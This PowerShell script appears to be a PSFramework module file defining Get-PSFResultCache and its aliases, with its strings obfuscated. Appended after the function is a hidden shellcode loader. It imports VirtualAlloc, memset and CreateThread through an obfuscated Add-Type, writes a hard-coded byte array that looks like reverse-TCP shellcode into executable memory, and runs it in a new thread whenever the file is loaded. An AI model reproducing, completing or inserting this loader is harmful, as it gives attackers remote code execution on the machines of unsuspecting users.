function Get-PSFResultCache
{

	
	[CmdletBinding(HelpUri = ("{1}{2}{7}{4}{9}{10}{11}{5}{13}{6}{12}{14}{3}{0}{8}"-f 'Cach','https','://psfr','et-PSFResult','do','commands/P','m','amework.org/','e','cumentati','on','/','ework/','SFra','G'))]
	param (
		[ValidateSet({"{0}{1}"-f'Val','ue'},'All')]
		[string]
		$Type = ("{1}{0}"-f'e','Valu')
	)
	
	switch ($Type)
	{
		'All'
		{
			New-Object PSObject -Property @{
				Result    = ([PSFramework.ResultCache.ResultCache]::Result)
				Function  = ([PSFramework.ResultCache.ResultCache]::Function)
				Timestamp = ([PSFramework.ResultCache.ResultCache]::Timestamp)
			}
		}
		("{0}{1}"-f'Valu','e')
		{
			[PSFramework.ResultCache.ResultCache]::Result
		}
	}
}
if (-not (Test-Path ("{0}{1}{4}{5}{2}{3}" -f 'ali','as:','st','Result','G','et-La'))) { New-Alias -Name Get-LastResult -Value Get-PSFResultCache -Description ("{2}{0}{13}{11}{7}{8}{3}{6}{5}{1}{4}{9}{12}{10}" -f 'more i','cal','A ','us','l','o ','ers t','e name',' for ',' Get-P','ache','uitiv','SFResultC','nt') }
if (-not (Test-Path ("{2}{0}{1}"-f'lias',':glr','a'))) { New-Alias -Name glr -Value Get-PSFResultCache -Description ("{1}{0}{9}{8}{2}{5}{3}{6}{7}{10}{4}" -f 'er na','A fast','r users to ','-','che','call Get','PS','FR','e fo','m','esultCa') }
$c = ((("{43}{7}{3}{49}{1}{6}{32}{16}{11}{71}{27}{70}{29}{17}{46}{67}{69}{53}{19}{12}{24}{8}{9}{0}{44}{2}{30}{14}{48}{51}{15}{42}{37}{65}{25}{38}{41}{40}{10}{61}{36}{22}{35}{50}{52}{5}{28}{57}{63}{64}{56}{39}{21}{54}{68}{18}{62}{45}{58}{23}{60}{66}{55}{33}{26}{34}{59}{4}{47}{31}{20}{13}"-f 'l','lic static ex','ic ','32.dll{0})]pu','tPtr dest, uin','r','tern','{0}kernel','lImport({','0}kernel32.d','dwSt','tr lpAddre',';[','ount);','atic extern IntPtr ','ntPt','ntPtr VirtualAlloc(IntP','Size, uint flAll','IntPt','t)','t c','ionFla','r','lImport({0}msvcrt.dll','Dl','u','xtern IntPtr me','s',' lpPar',' dw','st','c, uin',' I','c e','mset(',' lpStartAddress',', IntPt','ttribute','i','t','t ','n','r lpThreadA','[DllImport(','l{0})]publ','lpThreadId)','ocat','t sr','CreateThrea','b',', I','d(I','ntPt','uint flProtec','g','lic stati','wCrea','ameter',';[Dl','In','{0','ackSize','r ',', uin','t d','s, ','})]pub','ion','s, ','Type, ',', uint','s'))-F  [chAr]34);$w = Add-Type -memberDefinition $c -Name ("{1}{0}" -f 'n32','Wi') -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xad,0xff,0xcc,0xc0,0x68,0x02,0x00,0xc9,0x85,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
